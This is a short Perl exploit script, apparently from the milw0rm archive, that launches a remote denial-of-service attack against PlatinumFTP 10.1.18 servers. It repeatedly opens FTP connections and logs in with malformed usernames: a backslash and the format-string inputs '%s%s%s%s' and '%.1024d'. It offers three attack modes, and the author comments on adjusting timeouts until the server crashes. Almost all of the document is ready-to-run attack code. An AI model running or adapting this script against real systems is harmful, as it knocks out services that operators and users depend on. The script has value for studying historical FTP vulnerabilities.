#!/usr/bin/perl
#
# pftpdos-ai1.pl - Remote DoS against PlatinumFTP 10.1.18
# Details:http://seclists.org/lists/bugtraq/2005/Mar/0222.html
#
# If you don't get the server down try to change/play a little bit with
# the Timeout
#
# ports at securityforest dot com | greetings to muts, barabas, s|33py,
# revised and all guys at www.whitehat.co.il
#
# Thanks to str0ke from milw0rm for forcing me to shrink 3 PoCs into 1 :)
#
# 2005/05/03 portsonline.net

use strict;
use Net::FTP;

my $host;
my $username;
my $dostype;

if ($#ARGV < 1) { &syntax(); }

$host = $ARGV[0];
$dostype = $ARGV[1];

if ($dostype == '1') { $username = '\\'; }
if ($dostype == '2') { $username = '%s%s%s%s'; }
if ($dostype == '3') { $username = '%.1024d'; }

my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21)
or die "can you see a ftp server? i can't.\n";

print "denial of service tpye $dostype in progress\n";

while (my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21))
{
    my $ftp = Net::FTP->new($host, Timeout => 0.1, Debug => 0, Port => 21);
    $ftp->login($username);
}

print "server is down. now run forest, RUN!\n";

sub syntax {
    print "Usage: pftpdos-ai1.pl IP DOSTYPE(1-3)\n\n";
    print "DOSTYPE: 1 Using '\\' Username \n";
    print "DOSTYPE: 2 Using '%s%s%s%s' Username \n";
    print "DOSTYPE: 3 Using '%.1024d' Username \n";
    exit (1);
}

# milw0rm.com [2005-03-17]
